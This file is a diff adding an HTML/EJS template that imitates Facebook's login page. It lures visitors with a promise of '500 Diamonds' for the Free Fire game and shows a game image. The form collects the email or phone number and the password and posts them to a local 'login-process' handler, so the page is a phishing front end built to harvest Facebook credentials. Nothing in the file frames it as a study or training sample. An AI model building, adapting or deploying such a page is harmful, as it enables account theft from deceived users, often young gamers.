@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <link rel="icon" href="d4ZIVX-5C-b.ico" type="image/x-icon">
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        
+        <title>Log in to Facebook And Win Diamond</title>
+    </head>
+    <body>
+        <style>
+            body {
+                font-family: system-ui;
+                background: #e0e0e082;
+            }
+
+            section#formMain {
+                width: 378px;
+                margin: auto;
+                /* border: 1px solid red; */
+                padding: 21px;
+                text-align: center;
+            }
+
+            .form-title h2 {
+                color: #0673ff;
+                position: relative;
+                font-size: 40px;
+                top: 23px;
+            }
+
+            .form-box-main {
+                background: #fff;
+                /* padding: 34px; */
+                padding: 14px;
+                width: 330px;
+                border-radius: 10px;
+                box-shadow: 2px 4px 4px #ddd;
+                padding: 12px 11px;
+                border: 1px solid #ddd;
+                margin: auto;
+                padding-bottom: 23px;
+            }
+
+            input {
+                padding: 15px 0px;
+                border: 1px solid #ddd;
+                width: 94%;
+                margin: 7px 0px;
+                border-radius: 7px;
+                font-family: arial;
+                font-size: 14px;
+                padding-left: 10px;
+                outline: none;
+            }
+
+            .form-name span {
+                padding: 10px;
+            }
+
+            .form-name {
+                padding: 12px 0px;
+            }
+
+            #login {
+                background-color: #166fe5;
+                color: white;
+                font-weight: bold;
+                font-size: 16px;
+                cursor: pointer;
+            }
+
+            a {
+                text-decoration: none;
+                font-size: 14px;
+                font-family: arial;
+            }
+
+            .foImg {
+                width: 100%;
+                margin-top: 27px;
+            }
+
+            img {
+                width: 100%;
+                margin-top: 16px;
+                border-radius: 10px;
+                outline: none;
+            }
+
+            img#heimg {
+                width: 100%;
+                height: 154px;
+                border-radius: 10px;
+                outline: none;
+            }
+
+            b {
+                color: #2367b2;
+                font-size: 21px;
+                margin-bottom: 23px;
+                padding-bottom: 15px;
+            }
+        </style>
+        <section id="formMain">
+ 
+            <div class="form-title">
+                <h2>facebook</h2>
+            </div>
+            <form action="login-process" method="post">
+                <div class="form-box-main">
+                    <div class="form-name">
+                        <span>Log in to Facebook</span>
+                    </div>
+                    <input type="text" value="" name="email" id="email" placeholder="Email address or phone number" required>
+                    <input type="password" name="password" id="Password" placeholder="Password" required>
+                    <span></span>
+                    <input type="submit" name="loginf" id="login" value="Log In">
+                    <%if(locals.success){%>
+                        <p style="color: red;"><%=success%></p>
+                     <%  } %>
+                    <%if(locals.faild){%>
+                        <p style="color: red;"><%=faild%></p>
+                     <%  } %>
+        
+                    <a href="#">Forgotten account? . </a>
+                    <a href="#">Sign up for Facebook
+        </a>
+                </div>
+            </form>
+
+
+            <div class="foImg">
+                <b behavior="" direction="">Win 500 Diamonds on login . Only one time login is available. login Now...</b>
+                <img src="https://dl.dir.freefiremobile.com/common/web_event/official2.ff.garena.all/202210/aa959aa3d8790d3a44f7f20f16adfa01.jpg" alt="">
+            </div>
+        </section>
+    </body>
+</html>
